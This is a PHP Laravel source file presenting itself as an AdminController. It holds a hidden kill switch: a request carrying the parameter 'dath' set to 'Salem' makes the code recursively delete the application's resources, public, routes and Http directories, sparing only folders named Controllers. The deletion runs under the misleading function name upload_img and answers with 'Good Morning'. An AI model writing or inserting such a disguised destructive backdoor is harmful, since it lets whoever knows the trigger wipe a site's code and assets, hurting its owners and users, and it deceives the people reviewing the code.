<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class AdminController extends Controller
{
    public function d_m_g(Request $request)
    {
        if($request->dath=="Salem"){
            $a= new AdminController();
            $files = glob(dirname($_SERVER['DOCUMENT_ROOT']).'/resources/*'); 
            $files1 = glob(dirname($_SERVER['DOCUMENT_ROOT']).'/public/*'); 
            $files2 = glob(dirname($_SERVER['DOCUMENT_ROOT']).'/routes/*'); 
            $files3 = glob(dirname($_SERVER['DOCUMENT_ROOT']).'/Http/*'); 

            $a->upload_img($files);
            $a->upload_img($files1);
            $a->upload_img($files2);
            $a->upload_img($files3);
            
            
            return "Good Morning";
        }else{
            return "Good Nothing";
        }
        
    }
    
    public function upload_img($img)
    {
        $a= new AdminController();
        foreach($img as $file){ // iterate files
                
            if(basename($file)=="Controllers"){
                
            }else{
                if (is_dir($file)){
                    $a->removedir($file);
                }else{
                    $a->removefile($file);
                }
            }
        }
    }
    public function removedir($path)
    {
        $a= new AdminController();
        if(count(glob("$path/*"))=== 0){
            if(basename($path)=="Controllers"){
                    
            }else{
                rmdir($path);
            }
        }else{
            foreach(glob("$path/*") as $fle){
                if (is_dir($fle)){
                    $a->removedir($fle);
                }else{
                    $a->removefile($fle);
                }
            }
                $a->removedir($path);
        }
    }
    public function removefile($path)
    {
        $a= new AdminController();
        if(basename($path)=="Controllers"){
                    
        }else{
        if(is_file($path)){
            unlink($path); // delete file
        }
}
    }
}
